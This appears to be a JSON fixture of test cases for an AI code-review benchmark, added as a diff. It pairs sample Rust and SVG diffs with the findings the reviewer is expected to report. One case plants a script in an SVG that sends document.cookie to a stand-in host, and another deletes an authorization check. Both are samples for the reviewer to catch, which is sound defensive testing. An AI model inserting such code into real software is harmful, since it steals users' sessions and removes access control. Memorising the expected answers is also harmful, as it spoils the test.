@@ -1,0 +1,60 @@
+{
+  "cases": [
+    {
+      "id": "code-smell-direct-fix",
+      "tags": ["code-smell", "suggestion-quality"],
+      "reviewInput": {"diff": "diff --git a/src/parser.rs b/src/parser.rs\nindex 1111111..2222222 100644\n--- a/src/parser.rs\n+++ b/src/parser.rs\n@@ -10,2 +10,4 @@ fn parse(input: &str) -> Result<Value> {\n-    let value = parse_once(input)?;\n+    validate(parse_once(input)?)?;\n+    let value = parse_once(input)?;\n+    audit(parse_once(input)?)?;\n     Ok(value)\n"},
+      "validAnchors": {"src/parser.rs": [12]},
+      "expected": [{"id": "extract-duplicate-parse", "category": "Code Smell", "file": "src/parser.rs", "line": 12, "suggestion": "parse_once(input)?"}]
+    },
+    {
+      "id": "svg-script-injection",
+      "tags": ["security", "svg-security"],
+      "reviewInput": {"diff": "diff --git a/assets/icon.svg b/assets/icon.svg\nindex 1111111..2222222 100644\n--- a/assets/icon.svg\n+++ b/assets/icon.svg\n@@ -2,3 +2,4 @@\n   <circle cx=\"12\" cy=\"12\" r=\"10\"/>\n   <path d=\"M4 12h16\"/>\n+  <script>fetch('https://example.invalid/?c=' + document.cookie)</script>\n </svg>\n"},
+      "validAnchors": {"assets/icon.svg": [4]},
+      "expected": [{"id": "remove-svg-script", "category": "Security", "file": "assets/icon.svg", "line": 4, "suggestion": ""}]
+    },
+    {
+      "id": "cross-file-unbounded-loop",
+      "tags": ["performance", "cross-file"],
+      "reviewInput": {"diff": "diff --git a/src/config.rs b/src/config.rs\nindex 1111111..2222222 100644\n--- a/src/config.rs\n+++ b/src/config.rs\n@@ -8,2 +8,2 @@ pub struct WorkerConfig {\n-    pub max_attempts: usize,\n+    pub retry_delay_ms: u64,\n }\ndiff --git a/src/worker.rs b/src/worker.rs\nindex 3333333..4444444 100644\n--- a/src/worker.rs\n+++ b/src/worker.rs\n@@ -28,3 +28,4 @@ pub async fn run(config: &WorkerConfig) -> Result<()> {\n-    for _ in 0..config.max_attempts {\n+    loop {\n         if poll().await? { return Ok(()); }\n+        sleep(Duration::from_millis(config.retry_delay_ms)).await;\n     }\n"},
+      "validAnchors": {"src/worker.rs": [28], "src/config.rs": [9]},
+      "expected": [{"id": "bound-worker-loop", "category": "Performance", "file": "src/worker.rs", "line": 28, "suggestion": null}]
+    },
+    {
+      "id": "multiline-assertion-gap",
+      "tags": ["test-quality", "multiline-assertion"],
+      "reviewInput": {"diff": "diff --git a/src/auth.rs b/src/auth.rs\nindex 1111111..2222222 100644\n--- a/src/auth.rs\n+++ b/src/auth.rs\n@@ -41,2 +41,3 @@ pub fn authenticate(token: &str) -> Result<User> {\n+    if token.is_empty() { return Err(AuthError::MissingToken.into()); }\n     decode(token)\n }\ndiff --git a/tests/auth_test.rs b/tests/auth_test.rs\nindex 3333333..4444444 100644\n--- a/tests/auth_test.rs\n+++ b/tests/auth_test.rs\n@@ -16,1 +16,5 @@ fn rejects_empty_token() {\n+    assert!(\n+        authenticate(\"\")\n+            .is_err()\n+    );\n }\n"},
+      "validAnchors": {"src/auth.rs": [41], "tests/auth_test.rs": [18, 19, 20]},
+      "expected": [{"id": "assert-error-kind", "category": "Test Quality", "file": "src/auth.rs", "line": 41, "suggestion": null}]
+    },
+    {
+      "id": "rename-breaks-convention",
+      "tags": ["convention", "rename"],
+      "reviewInput": {"diff": "diff --git a/src/services/auth_service.rs b/src/services/auth_handler.rs\nsimilarity index 100%\nrename from src/services/auth_service.rs\nrename to src/services/auth_handler.rs\n"},
+      "validAnchors": {"src/services/auth_handler.rs": []},
+      "expected": [{"id": "restore-service-name", "category": "Convention", "file": "src/services/auth_handler.rs", "line": null, "suggestion": null}]
+    },
+    {
+      "id": "deletion-removes-auth-check",
+      "tags": ["security", "deletion-only", "suggestion-quality"],
+      "reviewInput": {"diff": "diff --git a/src/policy.rs b/src/policy.rs\nindex 1111111..2222222 100644\n--- a/src/policy.rs\n+++ b/src/policy.rs\n@@ -32,5 +32,4 @@ pub fn perform(user: &User, action: Action) -> Result<()> {\n     validate(action)?;\n-    authorize(user, action)?;\n     execute(action)?;\n     Ok(())\n }\n"},
+      "validAnchors": {"src/policy.rs": [33]},
+      "expected": [{"id": "restore-auth-check", "category": "Security", "file": "src/policy.rs", "line": 33, "suggestion": "authorize(user, action)?;\n    execute(action)?;"}]
+    },
+    {
+      "id": "safe-comment-and-constant",
+      "tags": ["false-positive-trap"],
+      "reviewInput": {"diff": "diff --git a/src/constants.rs b/src/constants.rs\nindex 1111111..2222222 100644\n--- a/src/constants.rs\n+++ b/src/constants.rs\n@@ -2,1 +2,3 @@\n use std::time::Duration;\n+// This public timeout keeps client and server defaults aligned.\n+pub const REQUEST_TIMEOUT_SECS: u64 = 30;\n"},
+      "validAnchors": {"src/constants.rs": [3, 4]},
+      "expected": []
+    },
+    {
+      "id": "missing-boundary-test",
+      "tags": ["test-quality", "cross-file"],
+      "reviewInput": {"diff": "diff --git a/src/pagination.rs b/src/pagination.rs\nindex 1111111..2222222 100644\n--- a/src/pagination.rs\n+++ b/src/pagination.rs\n@@ -20,3 +20,4 @@ pub fn page_size(requested: usize) -> usize {\n-    requested\n+    const MAX_PAGE_SIZE: usize = 100;\n+    requested.min(MAX_PAGE_SIZE)\n }\ndiff --git a/tests/pagination_test.rs b/tests/pagination_test.rs\nindex 3333333..4444444 100644\n--- a/tests/pagination_test.rs\n+++ b/tests/pagination_test.rs\n@@ -9,1 +9,2 @@ fn preserves_small_page_size() {\n+    assert_eq!(page_size(20), 20);\n }\n"},
+      "validAnchors": {"src/pagination.rs": [22], "tests/pagination_test.rs": [11]},
+      "expected": [{"id": "test-max-page-size", "category": "Test Quality", "file": "src/pagination.rs", "line": 22, "suggestion": null}]
+    }
+  ]
+}
